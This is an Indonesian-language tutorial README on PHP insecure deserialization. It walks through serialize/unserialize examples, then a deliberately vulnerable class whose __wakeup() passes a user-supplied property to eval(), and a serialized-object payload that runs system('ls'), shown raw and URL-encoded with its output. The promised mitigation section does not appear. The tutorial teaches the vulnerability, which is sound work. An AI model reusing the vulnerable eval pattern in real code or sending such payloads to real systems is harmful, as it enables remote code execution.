# Insecure Deserialization <img src="https://raw.githubusercontent.com/MartinHeinz/MartinHeinz/master/wave.gif" width="30px">
![](https://img.shields.io/badge/-Cyber_Security-informational?style=flat&logo=<LOGO_NAME>&logoColor=white&color=26D4C8&width=)
  <a href="https://www.instagram.com/achmd.f_/?next=%2F">
    <img alt="Abhishek's Instagram" width="22px" src="https://raw.githubusercontent.com/hussainweb/hussainweb/main/icons/instagram.png" />
  </a>
  <a href="https://www.linkedin.com/in/achmad-firdaus-b4a290116/">
    <img alt="Abhishek's LinkedIN" width="22px" src="https://raw.githubusercontent.com/peterthehan/peterthehan/master/assets/linkedin.svg" />
  </a>
  
  
  
  
Pada bagian ini saya akan membahas tentang Deserialisasi yang tidak aman, menjelaskan bagaimana hal tersebut berpotensi mendapatkan serangan dan cara untuk mengeksploitasinya sampai ketahap RCE. Saya akan mencoba menggunakan sekeraino dengan bahasa pemrogramman PHP dan saya juga akan menjelaskan tentang bagaimana cara mengatasi Deserialisasi yang tidak aman.

Tags:
![](https://img.shields.io/badge/-serialize-informational?style=flat&logo=<LOGO_NAME>&logoColor=white&color=2bbc8a)
![](https://img.shields.io/badge/unserialize-informational?style=flat&logo=<LOGO_NAME>&logoColor=white&color=2ba9bc)

### LIST
- [<b>Introduction</b>](#introduction-)
  - [What Is Deserialization?](#what-is-deserialization)
- [<b>Example of Introduction</b>](#example-intro-)
  - [Example Serialize](#example-serialize)
  - [Example Unserialize](#example-unserialize)
- [<b>Deserialization</b>](#deserialization-)
  - [Tampilan Web](#tampilan-web)
    - [Input String](#input-string)
    - [Input Serialize](#input-serialize)
- [<b>Object Deserialization</b>](#object-deserialization-)
  - [Apa itu __wakeup()?](#apa-itu-__wakeup-)
  - [Apa itu __destruct()?](#apa-itu-__destruct-)
  - [Apa itu eval(phpcode)?](#apa-itu-evalphpcode-)
  - [Script Deserialization](#script-deserialization-)
  - [Example Object Deserialization](#example-object-deserialization-)
    - [Input Object Serialize](#input-object-serialize)




### INTRODUCTION 👻
  - #### What Is Deserialization?
    Deserialisasi adalah proses dari fungsi unserialize yang akan mnelakukan pengembalian value yang sudah dirubah ke bentuk lain tanpa mengubah type dan struktur data yang dilakukan menggunakan fungsi serialize. Memanfaatkan <b>Serialization</b> akan mempermudah untuk melakukan penyimpanan ke dalam database dan dengan menggunakan fungsi tersebut akan membuat performa database tidak terlalu berat karena data array tidak perlu dipecah dan disimpan pada setiap column didatabase, cukup menggunakan 1 column untuk data array yang ingin disimpan. 

    Tetapi hal tersebut memiliki celah keamanan karena penyerang dapat melakukan manipulasi object serial berbahaya untuk diteruskan kedalam kode dan dieksekusi. Ada faktor yang menyebabkan kerenanan, mungkin kita berpikir bahwa data yang disimpan menggunakan <b>Serialization</b> akan aman karena tidak mudah dibaca atau memanipulasi data secara efektif. Walaupun penyerang memerlukan usaha untuk menentukan metode mana yang dapat dipanggil menggunakan data berbahaya, penyeraeng dapat melakukan serangan beruntun secara tidak tertuga dan melakukan inputan data yang berbahaya dengan <b>Serialization</b>.


### EXAMPLE INTRO 👻
  - #### Example Serialize
    Berikut adalah contoh <b>serialize</b>:

      - Script PHP:

            <?php 
                $array      = array("Cyber","Punk");
                $string     = "Cyber Punk";
                $integer    = 12345;

                echo 'This Result data array: '. serialize($array). PHP_EOL;
                echo 'This Result data string: '. serialize($string). PHP_EOL;
                echo 'This Result data integer: '. serialize($integer). PHP_EOL;
            ?>

      - Yang dihasilkan:

            This Result data array: a:2:{i:0;s:5:"Cyber";i:1;s:4:"Punk";}
            This Result data string: s:10:"Cyber Punk";
            This Result data integer: i:12345;

    Bila melihat contoh diatas, kita dapat memanfaatkan fungsi <b>serialize</b> untuk melakukan perubahan bentuk value ke bentuk lainnya. Yang menghasilkan text dengan huruf dan angka yang dipisahkan oleh tanda titik dua (:), setiap huruf dan angka memiliki arti untuk mengidentifikasi sebuah value yang dirubah.

    Penjelasan singkat:

      - array:

        Data array dari <b> array("Cyber","Punk") </b> menjadi <b> a:2:{i:0;s:5:"Cyber";i:1;s:4:"Punk";} </b>

          - <b>a:2</b>                  adalah <b>a</b> artinya array , <b>2</b> artinya jumlah index

          - <b>i:0;s:5:"Cyber";</b>     adalah <b>i:0;</b> artinya index pertama adalah 0, <b>s:5:"Cyber";</b> atinya memiliki type string (s) dengan 5 karakter dari value string tersebut 

          - <b>i:1;s:4:"Punk";</b>     adalah <b>i:1;</b> artinya index kedua adalah 1, <b>s:4:"Punk";</b> atinya memiliki type string (s) dengan 4 karakter dari value string tersebut 


      - string:

        Data string dari <b> "Cyber Punk" </b> menjadi <b> s:10:"Cyber Punk"; </b>

          - <b>s:10:"Cyber Punk";</b>     atinya memiliki type string (s) dengan 10 karakter dari value string tersebut 

      - integer:

        Data string dari <b> 12345 </b> menjadi <b> i:12345; </b>

          - <b>i:12345;</b>     atinya memiliki type integer (i) 
    

  - #### Example Unserialize
    Berikut adalah contoh <b>unserialize</b>:

      - Script PHP:

            <?php 
                $array      = 'a:2:{i:0;s:5:"Cyber";i:1;s:4:"Punk";}';
                $string     = 's:10:"Cyber Punk";';
                $integer    = 'i:12345;';

                echo 'This Result data array: '; print_r(unserialize($array)); echo PHP_EOL;
                echo 'This Result data string: '; print_r(unserialize($string)); echo PHP_EOL;
                echo 'This Result data integer: '; print_r(unserialize($integer)); echo PHP_EOL;
            ?>

      - Yang dihasilkan:

            This Result data array: Array
            (
                [0] => Cyber
                [1] => Punk
            )

            This Result data string: Cyber Punk
            This Result data integer: 12345
    

### DESERIALIZATION 👻

#### Tampilan WEB
Berikut adalah contoh tampilan yang akan kita gunakan untuk melakukan <b>Deserialization</b>
![image](https://user-images.githubusercontent.com/77251566/201299382-b9aa67b2-3a6a-47b8-91d3-cc1756d77f65.png)
##

  - #### Input String
    Pengetesan dengan melakukan input pada form search dengan value string tanpa <b>serialize</b> 

        Cyber Punk:

    ![image](https://user-images.githubusercontent.com/77251566/201300858-53b43345-7302-4043-bf46-db647f045bc2.png)
    ##
    Perubahan yang dihasilkan:
      - Menghasilkan perubahan url karena memiliki param, sebagai berikut: 

            ?search=Cyber+Punk

  - #### Input <b>Serialize</b> 
    Pengetesan dengan melakukan input pada form search dengan value array dengan <b>serialize</b> 

        a:2:{i:0;s:5:"Cyber";i:1;s:4:"Punk";}:
    ![image](https://user-images.githubusercontent.com/77251566/201319928-9639de34-6299-4756-9d1b-72b30d479dcb.png)
    ##
    Perubahan yang dihasilkan:
      - Menghasilkan perubahan url karena memiliki param, sebagai berikut: 

            ?search=a%3A2%3A{i%3A0%3Bs%3A5%3A"Cyber"%3Bi%3A1%3Bs%3A4%3A"Punk"%3B}
      - Memunculkan data array hasil dari <b>unserialize</b> pada tampilan web: 

            Array ( [0] => Cyber [1] => Punk ) 


### OBJECT DESERIALIZATION 👻

  php object deserialization yaitu kerentanan pada applikasi yang memungkinkan penyerang untuk melakukan serangan jahat pada inputan yang rentan. Penyerang dapat melakukan injeksi serialization object ke panggilan unserialize() yang rentan dengan script arbitrary yang bisa mendapatkan isi dari /etc/passwd atau yang lainnya.<br>
  Adapun syarat untuk mengekpoitasi target dengan kerentanan php object injection, sebagai berikut:
  
  - Apliikasi harus memiliki CLASS yang mengimplemantasikan metode __wakeup atau __destruct yang dapat digunakan utnuk melakukan serangan berbahaya
  - CLASS yang digunakan harus dideklarasi ketika unserialize()
  
  #### Apa itu __wakeup()? <br>
  - Biasanya funsi ini untuk melakukan koneksi ulang kedatabase bila terjadi disconnected dan bila menggunakan deserialization, bisa juga fungsi ini akan diperiksa oleh unserialize() untuk melakukan rekontruksi object yang diterima.

  #### Apa itu __destruct()? <br>
  - Setelah semua script berhasil dieksekusi, fungsi ini akan dipanggil atau dieksekusi. Funsi ini kebalikan dari __construct().

  #### Apa itu eval(phpcode)? <br>
  - Fungsi <b>eval()</b> adalah untuk mengevaluasi string yang dibaca dan dijadikan sebagai kode PHP. String yang dibaca agar dapat diexecute harus berupa kode PHP yang valid dan harus diakhiri dengan titik koma. Jika terjadi kesalahan saat membaca nilai string dengan kode PHP yang valid maka <b>eval()</b> akan melakukan pengembalian nilai FALSE.


  #### Script Deserialization <br>
  - Berikut adalah script PHP web pada target yang akan digunakan untuk eksploitasi:
  
        <?php 
            class PHPObjectUser{
                public $username;
                public $password;
                function __wakeup(){
                    if(isset($this->username)){
                        $str=$this->username;
                        echo $str;
                        echo '  ';
                    }
                    if(isset($this->password)){
                        eval($this->password);
                        echo '  ';
                    }
                }
            }
            if(isset($req)){  
                $var1=unserialize($req);
                echo '<br><br>';
                print_r($var1);
            }else{
                print_r("");
            }
        ?>
    

  #### Example Object Deserialization <br>
  - #### Input <b>Object Serialize</b> 
    Pengetesan dengan melakukan input pada form search dengan value string dengan <b>Object Serialize</b> 

        O:13:"PHPObjectUser":2:{s:8:"username";s:13:"administrator";s:8:"password";s:13:"system('ls');";}
        
      ![image](https://user-images.githubusercontent.com/77251566/201449601-0d6dabde-2b22-4a99-8b3c-c7355a008122.png)
      ##
      Perubahan yang dihasilkan:
      - Menghasilkan perubahan url karena memiliki param, sebagai berikut:
        
            ?search=O%3A13%3A"PHPObjectUser"%3A2%3A{s%3A8%3A"username"%3Bs%3A13%3A"administrator"%3Bs%3A8%3A"password"%3Bs%3A13%3A"system('ls')%3B"%3B}
      - Memunculkan value dari username dan melakukan eksekusi perintah "ls" yang menghasilkan index.php 
      - Memunculkan data object hasil dari <b>unserialize</b> 

            PHPObjectUser Object ( [username] => administrator [password] => system('ls'); ) 




















